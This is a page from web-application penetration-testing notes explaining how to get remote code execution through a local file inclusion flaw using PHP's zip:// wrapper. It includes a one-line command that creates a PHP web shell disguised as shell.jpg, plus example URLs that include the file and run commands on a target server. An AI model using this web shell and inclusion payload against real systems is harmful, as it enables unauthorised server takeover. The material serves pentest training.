<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ZIP upload & ZIP Wrapper</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ZIP upload & ZIP Wrapper</h1><br/><br /><br />If <a href="Test_Methodology--WebApp_Pentest--Exploitation--Server-side--File_Inclusion--Remote_Code_Execution_(RCE)--LFI_-_File_Upload--Image_Upload.html">LFI/File Upload → Image Upload</a> does not work <span style="text-decoration:underline;">but the fuction in the backend is vulnerable</span> since allow code execution, we can try with:<br />• ZIP Upload &amp; ZIP Wrapper<br />• Phar Upload &amp; Phar Wrapper<br />These techniques may become handy in some specific cases where <a href="Test_Methodology--WebApp_Pentest--Exploitation--Server-side--File_Inclusion--Remote_Code_Execution_(RCE)--LFI_-_File_Upload--Image_Upload.html">LFI/File Upload → Image Upload</a> does not work. It anyway usually is more reliable<br /><br /><br /><strong><h3>ZIP Upload &amp; ZIP Wrapper</h3></strong><br />We can utilize the <a href="https://www.php.net/manual/en/wrappers.compression.php">zip</a> wrapper to execute PHP code. However, this wrapper isn&#39;t enabled by default, so this method may not always work. <br /><br />1. create a PHP web shell script  (example: shell.php) and zip it into a zip archive (example: shell.jpg):<br />  <div class="codebox"><pre>$ <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span> &gt; shell.php <span style="color:#ff9d00;font-weight:700">&amp;&amp;</span> <span style="color:#ff9d00;font-weight:700">zip</span> shell.jpg shell.php</pre></div><br />	<span style="text-decoration:underline;">Note:</span> some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.<br /><br />2. upload the zip archive (example: shell.jpg)<br />3. include the zip archive (example: shell.jpg) with the zip wrapper (example: zip://shell.jpg)<br />   1) refer to the file within it with <code>#FILE.EXT</code>  (example: <code>#shell.php</code>  → (URL encoded) →   <code>%23shell.php</code> )<br />   2) execute commands with <code>&amp;cmd=id</code><br />	<div class="codebox"><pre>http<span style="color:#ff9d00;font-weight:700">://</span>&lt;SERVER_IP&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;PORT&gt;<span style="color:#ff9d00;font-weight:700">/</span>index.php?language=<span style="color:#ff9d00;font-weight:700">zip://</span>.<span style="color:#ff9d00;font-weight:700">/</span>profile_images<span style="color:#ff9d00;font-weight:700">/</span>shell.jpg%23shell.php<span style="color:#ff9d00;font-weight:700">&amp;</span>cmd=<span style="color:#ff9d00;font-weight:700">id</span></pre></div><br />	<div class="codebox"><pre>http<span style="color:#ff9d00;font-weight:700">://</span>&lt;SERVER_IP&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;PORT&gt;<span style="color:#ff9d00;font-weight:700">/</span>index.php?language=<span style="color:#ff9d00;font-weight:700">zip://</span>profile_images<span style="color:#ff9d00;font-weight:700">/</span>shell.jpg%23shell.php<span style="color:#ff9d00;font-weight:700">&amp;</span>cmd=<span style="color:#ff9d00;font-weight:700">id</span></pre></div><br />	<span style="text-decoration:underline;">Note:</span> In this example is been added the uploads directory (./profile_images/) before the file name, because the vulnerable page(index.php)/ Function is in the main directory.<br /><br /><br /><strong>Bibliography:</strong><br /><a href="https://www.php.net/manual/en/wrappers.compression.php">https://www.php.net/manual/en/wrappers.compression.php</a></div>
</body>
</html>
